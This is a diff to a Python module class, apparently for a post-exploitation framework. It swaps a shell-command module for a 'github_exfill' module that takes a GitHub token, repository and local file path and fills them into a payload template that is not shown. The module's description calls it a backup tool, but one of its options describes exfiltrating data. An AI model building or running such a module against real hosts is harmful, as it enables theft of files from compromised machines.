@@ -1,22 +1,48 @@
 class STModule:
     def __init__(self):
-        self.name = 'shell'
-        self.description = 'Runs a shell command'
-        self.author = '@byt3bl33d3r'
+        self.name = 'github_exfill'
+        self.description = 'Backs up files to a github repo'
+        self.author = 'Tristan Messner'
         self.options = {
-            'Command': {
-                'Description'   :   'The ShellCommand to execute, including any arguments',
+            'Username': {
+                'Description'   :   'The username of your github account',
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'PAT': {
+                'Description'   :   'Your github personal access token',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
+            'Repo': {
+                'Description'   :   'The github repo to exfilltrate data to',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
+            'Repo_path': {
+                'Description'   :   'The file path to store the backup file. should end with a /',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
+            'Repo_file': {
+                'Description'   :   'The name to store the backup file under',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
+            'Local_file': {
+                'Description'   :   'The path to the local file to backup',
+                'Required'      :   True,
+                'Value'         :   ''
+            }
         }
 
     def payload(self):
-        with open('modules/src/shell.py', 'r') as module_src:
+        with open('modules/src/github_exfill.py', 'r') as module_src:
             src = module_src.read()
-            src = src.replace("COMMAND_TO_RUN", self.options['Command']['Value'])
-            src = src.replace("PATH", self.options['Path']['Value'])
-            src = src.replace("USERNAME", self.options['Username']['Value'])
-            src = src.replace("DOMAIN", self.options['Domain']['Value'])
-            src = src.replace("PASSWORD", self.options['Password']['Value'])
+            src = src.replace("GHUSER", self.options['Username']['Value'])
+            src = src.replace("GH_PAT", self.options['PAT']['Value'])
+            src = src.replace("GHREPO", self.options['Repo']['Value'])
+            src = src.replace("GHPATH", self.options['Repo_path']['Value'])
+            src = src.replace("GHFILE", self.options['Repo_file']['Value'])
+            src = src.replace("LOCALFILE", self.options['Local_file']['Value'])
             return src.encode()
